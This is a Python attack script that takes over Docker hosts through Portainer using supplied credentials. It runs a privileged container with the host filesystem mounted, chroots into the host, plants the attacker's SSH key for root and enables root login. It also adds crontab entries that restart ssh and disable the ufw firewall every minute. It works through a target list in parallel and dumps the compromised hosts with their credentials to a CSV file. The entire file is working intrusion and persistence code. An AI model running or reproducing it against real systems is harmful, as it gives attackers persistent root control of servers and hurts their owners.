#! /usr/bin/env python3

import socket, os, requests, json, paramiko
from getpass import getpass
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Pool, Lock, cpu_count
from time import strftime, localtime, sleep

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

thread_count = cpu_count()
lock = Lock()
check_ssh = True

def check_port(host, port, timeout=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            socket.setdefaulttimeout(timeout)
        result = sock.connect_ex((host, port))
    except:
        return False
    else:
        if result == 0:
            return True
        sock.close()
def generatePublicPrivateKeys():
    display(':', "Creating New Private/Public Key Pairs")
    display('+', "Enter the file in which to save the key : ", end='')
    key_path = input()
    key_passphrase = getpass("Enter the Passphrase for the key : ")
    os.system(f"ssh-keygen -t rsa -b 4096 -C root -f '{key_path}' -N '{key_passphrase}'")
    return key_path, key_passphrase

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

class Portainer:
    auth_api = "/api/auth"
    endpoints_api = "/api/endpoints"
    endpoint_docker_images = "/docker/images/json"
    endpoint_docker_image_push = "/docker/images/load"
    endpoint_docker_image_delete = "/docker/images/"
    endpoint_docker_container_create = "/docker/containers/create"
    endpoint_docker_container_delete = "/docker/containers/"

    allowed_images = ["ubuntu", "debian", "fedora"]
    image_file = "ubuntu_image.tar"
    default_image_name = "ubuntu:20.04"

    ssh_port = 22
    ssh_configure_commands = "echo '* * * * * root systemctl start ssh' >> /etc/crontab && echo '* * * * * root ufw disable' >> /etc/crontab && "
    cronjob_remove_commands = "grep -v '* * * * * root systemctl start ssh' /etc/crontab > /tmp/crontab && mv /tmp/crontab /etc/crontab"
    cronjob_sleep_time = 90

    container_name = "health_test"

    def __init__(self, ip, port, scheme="http"):
        self.ip = ip
        self.port = port
        self.url = f"{scheme}://{ip}:{port}"
        self.headers = {}
    def auth(self, username, password):
        login_data = {
            "username": username,
            "password": password
        }
        response = requests.post(f"{self.url}{Portainer.auth_api}", json=login_data)
        if response.status_code // 100 == 2:
            self.token = json.loads(response.text)["jwt"]
            self.headers["Authorization"] = f"Bearer {self.token}"
            return True
        elif response.status_code // 100 == 5:
            return True
        return False
    def getEndpoints(self):
        response = requests.get(f"{self.url}{Portainer.endpoints_api}", headers=self.headers)
        if response.status_code // 100 == 2:
            self.endpoints = json.loads(response.text)
            return True
        return False
    def getEndpointImages(self, endpoint):
        response = requests.get(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_images}", headers=self.headers)
        return json.loads(response.text) if response.status_code // 100 == 2 else False
    def pushEndpointImage(self, endpoint, image_data):
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_image_push}", headers=self.headers, data=image_data)
        return True if response.status_code // 100 == 2 else False
    def removeEndpointImage(self, endpoint, image_name):
        response = requests.delete(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_image_delete}{image_name}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def createEndpointContainer(self, endpoint, container_name, image_name, command, host_volume_path='/', container_mounted_path='/host', privileged_mode=True):
        container_config = {
            "Hostname": container_name,
            "Image": image_name,
            "Cmd": ["/bin/sh", '-c', command],
            "HostConfig": {
                "Binds": [f"{host_volume_path}:{container_mounted_path}:rw"],
                "Privileged": privileged_mode
            }
        }
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_container_create}", headers=self.headers, json=container_config)
        return json.loads(response.text)["Id"] if response.status_code // 100 == 2 else False
    def startEndpointContainer(self, endpoint, container_id):
        endpoint_docker_container_delete = f"/docker/containers/{container_id}/start"
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{endpoint_docker_container_delete}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def waitEndpointContainer(self, endpoint, container_id):
        endpoint_docker_container_wait = f"/docker/containers/{container_id}/wait"
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{endpoint_docker_container_wait}", headers=self.headers)
        return json.loads(response.text)["StatusCode"] if response.status_code // 100 == 2 else False
    def deleteEndpointContainer(self, endpoint, container_id):
        response = requests.delete(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_container_delete}{container_id}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def exploit(self, public_key, private_key_file_path, private_key_passphrase, check_ssh_port=True):
        endpoint_status = self.getEndpoints()
        if not endpoint_status:
            return []
        exploit_statues = []
        for index, endpoint in enumerate(self.endpoints):
            images = self.getEndpointImages(endpoint)
            if not images:
                exploit_statues.append(False)
                continue
            required_image_found, required_image_name = False, None
            for image in images:
                if image["RepoTags"] == None:
                    continue
                available_images = [available_image.split(':')[0] for available_image in image["RepoTags"]]
                for allowed_image in Portainer.allowed_images:
                    if allowed_image in available_images:
                        for available_image in image["RepoTags"]:
                            if available_image.startswith(allowed_image):
                                with lock:
                                    display('+', f"Found Image {Back.MAGENTA}{available_image}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                                required_image_found = True
                                required_image_name = available_image
                                break
                        break
                if required_image_found:
                    break
            else:
                with lock:
                    display('-', f"Any Preinstalled usable Docker Image not found on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}!")
                required_image_name = Portainer.default_image_name
                with open(Portainer.image_file, 'rb') as file:
                    image_data = file.read()
                with lock:
                    display('*', f"Pushing Image {Back.MAGENTA}{required_image_name}{Back.RESET} to {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                image_push_status = self.pushEndpointImage(endpoint, image_data)
                if not image_push_status:
                    with lock:
                        display('-', f"Failed to Push Image {Back.MAGENTA}{required_image_name}{Back.RESET} to {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    exploit_statues.append(False)
                    continue
            commands = ""
            if check_ssh_port:
                ssh_port_status = check_port(self.ip, Portainer.ssh_port)
                if not ssh_port_status:
                    with lock:
                        display(':', f"SSH was not Running on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}. Adding Configuration Scripts in CRONJOB!")
                    commands += Portainer.ssh_configure_commands
            else:
                ssh_port_status = True
            with lock:
                display('+', f"Using Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display('-', f"Exploiting {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}...")
            commands += f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config && mv /tmp/sshd_config /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && grep -v 'Port' /etc/ssh/sshd_config >/tmp/sshd_config && mv /tmp/sshd_config /etc/ssh/sshd_config && echo Port 22 >> /etc/ssh/sshd_config && echo '' >> /root/.ssh/authorized_keys && grep '{public_key}' -v /root/.ssh/authorized_keys > /tmp/authorized_keys && mv /tmp/authorized_keys /root/.ssh/authorized_keys && echo {public_key} >> /root/.ssh/authorized_keys"
            with lock:
                display(':', f"Using Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to Create a Container")
            container_id = self.createEndpointContainer(endpoint, Portainer.container_name, required_image_name, f"chroot /host /bin/bash -c \"{commands}\"")
            if not container_id:
                with lock:
                    display('-', f"Failed to Create Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                exploit_statues.append(False)
                continue
            with lock:
                display('+', f"Container created with Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display(':', f"Starting the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            start_status = self.startEndpointContainer(endpoint, container_id)
            if not start_status:
                with lock:
                    display('-', f"Failed to start Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                exploit_statues.append(False)
                continue
            with lock:
                display('+', f"Started the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display(':', f"Waiting for the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to finish Execution")
            container_exit_status = self.waitEndpointContainer(endpoint, container_id)
            with lock:
                display('+', f"Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} finished Executing")
                display(':', f"Deleting Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            delete_status = self.deleteEndpointContainer(endpoint, container_id)
            if not delete_status:
                with lock:
                    display('-', f"Failed to Delete Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            else:
                with lock:
                    display('+', f"Deleted Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            if not required_image_found:
                with lock:
                    display(':', f"Deleting Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                image_delete_status = self.removeEndpointImage(endpoint, required_image_name)
                if not image_delete_status:
                    with lock:
                        display('-', f"Failed to Delete Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                else:
                    with lock:
                        display('+', f"Deleted Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            with lock:
                display(':', f"Checking if Target {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} was successfully exploited or not")
            exploit_check_status, info = self.check_exploit(private_key_file_path, private_key_passphrase, False if ssh_port_status else True)
            if exploit_check_status:
                with lock:
                    display('+', f"Successfully Exploited Target => {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
            else:
                with lock:
                    display('-', f"Failed to Exploit Target {Back.YELLOW}{self.ip}:{self.port}{Back.RESET} {info}")
            exploit_statues.append(True if container_exit_status == 0 and exploit_check_status else False)
        return exploit_statues
    def check_exploit(self, private_key_file_path, private_key_passphrase, wait=False, port=22, user="root"):
        if wait:
            sleep(Portainer.cronjob_sleep_time)
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        private_key = paramiko.RSAKey.from_private_key_file(private_key_file_path, private_key_passphrase)
        try:
            ssh_client.connect(self.ip, port=port, username=user, pkey=private_key)
            stdin, stdout, stderr = ssh_client.exec_command("uname -a")
            info = stdout.readlines()[0]
            ssh_client.close()
            return True, info.replace('\n', '')
        except Exception as error:
            return False, error

def multiProcessingHandler(targets, key_path, public_key, key_passphrase, checkPort=True):
    successful_exploits = []
    for ip, port, username, password in targets:
        portainer_target = Portainer(ip, port)
        with lock:
            display(':', f"Authentication {Back.MAGENTA}{ip}:{port}{Back.RESET}...")
        try:
            auth_status = portainer_target.auth(username, password)
            if not auth_status:
                with lock:
                    display('-', f"Authentication Failed for {Back.MAGENTA}{ip}:{port}{Back.RESET}")
                continue
        except Exception as error:
            with lock:
                display('-', f"Authentication Failed for {Back.MAGENTA}{ip}:{port}{Back.RESET}")
            continue
        with lock:
            display('+', f"Authentication Successful {Back.MAGENTA}{ip}:{port}{Back.RESET}")
        try:
            exploit_statues = portainer_target.exploit(public_key, key_path, key_passphrase, checkPort)
            if True in exploit_statues:
                with lock:
                    display('+', f"Successfully Exploited {Back.MAGENTA}{ip}:{port}{Back.RESET}")
                successful_exploits.append([ip, port, username, password])
        except Exception as error:
            with lock:
                display('-', f"Error while Exploiting {Back.MAGENTA}{ip}:{port}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            continue
    return successful_exploits

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "JSON File Containing Information about Targets ([[IP, PORT, USERNAME, PASSWORD], ...])"),
                              ('-p', "--keys-path", "key_path", "Path for Public Key for SSH (Leave Empty to Generate New)"),
                              ('-c', "--check-port", "check_port", f"Check SSH Port (True/False, Default={check_ssh})"),
                              ('-w', "--write", "write", "File to Dump Successful Exploited Targets (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Information File{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = json.loads(file.read())
        except FileNotFoundError:
            display('-', f"File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}Not Found{Back.RESET}")
            exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.key_path:
        try:
            with open(f"{arguments.key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
            key_passphrase = getpass(f"Enter Passpharse for {arguments.key_path} : ")
            key_path = arguments.key_path
        except FileNotFoundError:
            key_path, key_passphrase = generatePublicPrivateKeys()
            try:
                with open(f"{key_path}.pub", 'r') as file:
                    arguments.public_key = file.read().replace('\n', '').strip()
            except Exception as error:
                display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{arguments.public_key}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    else:
        key_path, key_passphrase = generatePublicPrivateKeys()
        try:
            with open(f"{key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.check_port == "False":
        arguments.check_port = False
    else:
        arguments.check_port = check_ssh
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    total_targets = len(arguments.target)
    target_divisions = [arguments.target[group*total_targets//thread_count: (group+1)*total_targets//thread_count] for group in range(thread_count)]
    pool = Pool(thread_count)
    threads = []
    successful_exploits = []
    for thread_index, target_division in enumerate(target_divisions):
        threads.append(pool.apply_async(multiProcessingHandler, (target_division, key_path, arguments.public_key, key_passphrase, arguments.check_port)))
    for thread in threads:
        successful_exploits.extend(thread.get())
    pool.close()
    pool.join()
    display(':', f"Dumping Successfully Exploited Targets to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'w') as file:
        file.write(f"IP,PORT,USERNAME,PASSWORD\n")
        file.write('\n'.join([f"{ip},{port},{username},{password}" for ip, port, username, password in successful_exploits]))